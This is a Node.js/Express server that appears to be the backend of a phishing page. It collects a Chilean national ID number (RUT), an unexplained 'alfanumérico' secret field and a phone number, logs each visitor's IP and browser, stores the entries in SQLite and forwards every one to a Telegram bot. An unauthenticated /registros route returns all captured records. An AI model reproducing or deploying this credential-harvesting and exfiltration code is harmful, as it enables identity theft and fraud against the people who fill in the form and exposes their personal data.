const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const dbPath = path.join(__dirname, 'datos.db');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || process.env.TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '';

app.use(cors({ origin: true, credentials: true }));
app.options('*', cors({ origin: true, credentials: true }));
app.use(express.json());
app.use(express.static(__dirname));

const db = new sqlite3.Database(dbPath, (err) => {
  if (err) {
    console.error('Error al abrir la base de datos:', err.message);
  } else {
    console.log('Conectado a SQLite.');
  }
});

db.run(`
  CREATE TABLE IF NOT EXISTS ingresos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    numero TEXT NOT NULL,
    alfanumerico TEXT NOT NULL,
    telefono TEXT NOT NULL,
    user_agent TEXT,
    ip_address TEXT,
    navegador TEXT,
    fecha_creacion DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

[
  'telefono',
  'user_agent',
  'ip_address',
  'navegador'
].forEach((column) => {
  db.run(`ALTER TABLE ingresos ADD COLUMN ${column} TEXT`, (err) => {
    if (err && !/duplicate column/i.test(err.message)) {
      console.error(`No se pudo agregar la columna ${column}:`, err.message);
    }
  });
});

function obtenerIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (typeof forwarded === 'string') {
    return forwarded.split(',')[0].trim();
  }

  if (Array.isArray(forwarded)) {
    return forwarded[0]?.trim() || 'unknown';
  }

  return (
    req.headers['x-real-ip'] ||
    req.headers['cf-connecting-ip'] ||
    req.socket?.remoteAddress ||
    'unknown'
  );
}

function detectarNavegador(userAgent) {
  if (!userAgent) return 'Desconocido';

  const ua = userAgent.toLowerCase();

  if (ua.includes('edg')) return 'Microsoft Edge';
  if (ua.includes('opr') || ua.includes('opera')) return 'Opera';
  if (ua.includes('chrome') && !ua.includes('edg')) return 'Google Chrome';
  if (ua.includes('firefox')) return 'Mozilla Firefox';
  if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
  if (ua.includes('trident') || ua.includes('msie')) return 'Internet Explorer';

  return 'Otro navegador';
}

function validarRut(rut) {
  const clean = String(rut || '')
    .replace(/\./g, '')
    .replace('-', '')
    .toUpperCase();

  if (!/^[0-9]{7,8}[0-9K]$/.test(clean)) return false;

  const cuerpo = clean.slice(0, -1);
  const dv = clean.slice(-1);

  let suma = 0;
  let multiplo = 2;

  for (let i = cuerpo.length - 1; i >= 0; i--) {
    suma += Number(cuerpo[i]) * multiplo;
    multiplo = multiplo === 7 ? 2 : multiplo + 1;
  }

  const resto = 11 - (suma % 11);
  const dvEsperado = resto === 11 ? '0' : resto === 10 ? 'K' : String(resto);

  return dv === dvEsperado;
}

function validarTelefono(telefono) {
  const normalizado = String(telefono || '').replace(/\s+/g, '');
  return /^(\+?56)?9\d{8}$/.test(normalizado);
}

async function enviarNotificacionTelegram({ numero, alfanumerico, telefono, id, ip, navegador, userAgent }) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('Telegram no configurado. Se omite la notificación.');
    return;
  }

  const texto = `📥 Nuevo ingreso\n🆔 Registro: ${id}\n🔢 RUT: ${numero}\n📞 Teléfono: ${telefono}\n🔤 Alfanumérico: ${alfanumerico}\n🌐 Navegador: ${navegador}\n📍 IP: ${ip}\n🧭 User-Agent: ${userAgent || 'No disponible'}`;

  const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: texto,
      parse_mode: 'HTML'
    })
  });

  const data = await response.json().catch(() => ({}));

  if (!response.ok || !data.ok) {
    throw new Error(data.description || 'Error al enviar la notificación a Telegram');
  }

  console.log('Notificación enviada a Telegram correctamente.');
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok' });
});

app.post('/guardar', async (req, res) => {
  const numero = String(req.body.numero || '').trim();
  const alfanumerico = String(req.body.alfanumerico || '').trim();
  const telefono = String(req.body.telefono || '').trim();
  const userAgent = req.headers['user-agent'] || 'No disponible';
  const ipAddress = obtenerIP(req);
  const navegador = detectarNavegador(userAgent);

  if (!validarRut(numero)) {
    return res.status(400).json({ error: 'El RUT ingresado no es válido' });
  }

  if (!alfanumerico || alfanumerico.length === 0) {
    return res.status(400).json({ error: 'El campo alfanumérico no puede estar vacío' });
  }

  if (!validarTelefono(telefono)) {
    return res.status(400).json({ error: 'El teléfono debe tener formato +56 9 1234 5678' });
  }

  const sql = 'INSERT INTO ingresos (numero, alfanumerico, telefono, user_agent, ip_address, navegador) VALUES (?, ?, ?, ?, ?, ?)';

  db.run(sql, [numero, alfanumerico, telefono, userAgent, ipAddress, navegador], async function (err) {
    if (err) {
      console.error('Error al guardar:', err.message);
      return res.status(500).json({ error: 'Error al guardar en la base de datos' });
    }

    const registroId = this.lastID;

    try {
      await enviarNotificacionTelegram({
        numero,
        alfanumerico,
        telefono,
        id: registroId,
        ip: ipAddress,
        navegador,
        userAgent
      });
    } catch (telegramError) {
      console.error('Error al notificar Telegram:', telegramError.message);
    }

    return res.status(201).json({
      mensaje: 'Hemos recibido su solicitud correctamente',
      id: registroId
    });
  });
});

app.get('/registros', (req, res) => {
  db.all('SELECT * FROM ingresos ORDER BY id DESC', [], (err, rows) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    return res.json(rows);
  });
});

app.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});
